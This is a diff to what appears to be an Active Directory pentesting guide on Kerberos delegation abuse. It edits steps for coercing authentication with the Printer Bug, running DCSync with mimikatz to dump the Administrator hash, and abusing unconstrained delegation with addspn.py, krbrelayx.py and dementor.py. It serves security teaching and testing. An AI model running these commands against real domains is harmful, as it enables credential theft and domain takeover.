@@ -11,7 +11,7 @@
 > 
 > If the `impersonated` account is [is sensitive and cannot be delegated](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/how-to-configure-protected-accounts) or a member of the [Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) group, the delegation will fail.
 > 
-> The RID 500, "Administrator" account doesn't benefit from that restriction, even if it's added to the Protected Users group (source: [sensepost.com](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/)).
+> For RID 500, "Administrator" you need to tick the option “Account is sensitive and cannot be delegated” in the account settings even if the RID500 account is in Protected Users. (source: [sensepost](https://sensepost.com/blog/2023/protected-users-you-thought-you-were-safe-uh/))
 > 
 > By default, the salt is always:
 > 
@@ -81,8 +81,7 @@ PS C:\Tools> .\SpoolSample.exe dc01.corp.local sql01.corp.local
 Now, Suppose we got the TGT of the DC using [Printer Bug](#printer-bug), using targeted DCSync mimikatz to get the Administrator hash:
 
 ```PowerShell
-C:\Tools> mimikatz.exe
-mimikatz # lsadump::dcsync /user:Administrator
+C:\Tools> mimikatz.exe "lsadump::dcsync /user:Administrator" "exit"
 [SNIP]
 Credentials:
   Hash NTLM: a83b750679b1789e29e966d06c7e41f7
@@ -122,11 +121,11 @@ The scenario:
 Our scenario:
 
 - Attacker (A) compromised a target user account (B) that has `TRUSTED_FOR_DELEGATION` flag set.
-- Attacker (A) has also compromised `user0` which has `GenericWrite` privileges over user (B).
-- (A) will create a DNS record on the AD environment which will point at his rogue machine.
-- (A) will add `CIFS/malicious_dns_record` SPN to (B) account.
+- Attacker (A) has also compromised `user0` (C) which has `GenericWrite` privileges over user (B).
+- (A), using (C) will create a DNS record on the AD environment which will point at his rogue machine.
+- (A), using (C) will add `CIFS/malicious_dns_record` SPN to (B) account.
 - If a victim tried to connect via SMB to the attacker fake record:
-	- victim will ask the DC for a TGS for `CIFS/malicious_dns_record`.
+	- The victim will ask the DC for a TGS for `CIFS/malicious_dns_record`.
 	- The DC will embed a TGT for the victim account into the TGS.
 	- The TGS will be send to the IP set on the malicious DNS record.
 
@@ -144,7 +143,7 @@ $ nslookup rogue.corp.local dc01.corp.local
 # Craft SPN on the Target User
 # --target-type: [samname (for attacking a user)] - [hostname (for attacking a host /default)]
 # -t (the compromised user that has unconstrained delegation set)
-$ addspn.py -u corp.local\\user0 -p password --target-type samname -t vulnerableAccount -s CIFS/rogue.corp.local dc01.corp.local
+$ addspn.py -u corp.local\\user0 -p password --target-type samname -t vulnerableAccount(B) -s CIFS/rogue.corp.local dc01.corp.local
 
 # Use krbrelayx.py with the compromised account NT hash to decrypt the received TGS to extract the target TGT.
 $ sudo python krbrelayx.py -hashes :cf3a5525ee9414229e66279623ed5c58
@@ -156,7 +155,7 @@ krbrelayx.py -aesKey aes256-cts-hmac-sha1-96-VALUE
 # printerbug.py to coerce a target to autheticate back to the attacker
 $ printerbug.py corp.local/user0:password@<targetIP> rogue.corp.local
 # or user dementor.py
-$ dementor.py -u user0 -p password -d corp.local rogue.corp.local dc01.corp.local
+$ dementor.py -u user0 -p password -d corp.local <Listener_IP/rogue> <Target_IP/dc01>
 ```
 
 The TGT has been saved to disk in the following file `DC01$@CORP.LOCAL_krbtgt@CORP.LOCAL.ccache`. now we can conduct DCSync attack with the DC TGT.
